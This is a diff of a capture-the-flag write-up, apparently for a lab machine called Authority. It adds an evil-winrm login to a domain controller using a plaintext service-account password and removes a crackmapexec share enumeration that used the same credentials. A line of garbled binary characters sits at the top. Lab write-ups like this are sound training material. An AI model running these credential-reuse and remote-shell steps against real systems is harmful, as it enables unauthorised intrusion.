@@ -415,25 +415,22 @@ nj$f[2%`{kd.jS% [쐪/TF!;{ܟdb,+̩0̨/̪$(#'kjg@.2-1&*%)
 ```
 We can use the credentials to connect to the DC through winrm and retrieve the user flag
 ```console
+0ph3@parrot~$ evil-winrm -i 10.10.11.222 --user svc_ldap --password 'lDaP_1n_th3_cle4r!'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_ldap\Documents> cd ../desktop
+*Evil-WinRM* PS C:\Users\svc_ldap\desktop> dir
 
-```
 
-The ldap_svc user seems to also have access to the Department Shares
-```console
-┌─[root@parrot]─[/home/orph3u5]
-└──╼ #cme smb authority.htb -d authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --shares 
-SMB         authority.htb   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
-SMB         authority.htb   445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
-SMB         authority.htb   445    AUTHORITY        [*] Enumerated shares
-SMB         authority.htb   445    AUTHORITY        Share           Permissions     Remark
-SMB         authority.htb   445    AUTHORITY        -----           -----------     ------
-SMB         authority.htb   445    AUTHORITY        ADMIN$                          Remote Admin
-SMB         authority.htb   445    AUTHORITY        C$                              Default share
-SMB         authority.htb   445    AUTHORITY        Department Shares READ            
-SMB         authority.htb   445    AUTHORITY        Development     READ            
-SMB         authority.htb   445    AUTHORITY        IPC$            READ            Remote IPC
-SMB         authority.htb   445    AUTHORITY        NETLOGON        READ            Logon server share 
-SMB         authority.htb   445    AUTHORITY        SYSVOL          READ            Logon server share 
+    Directory: C:\Users\svc_ldap\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         1/9/2024   5:26 PM             34 user.txt
+
 ```
 
 
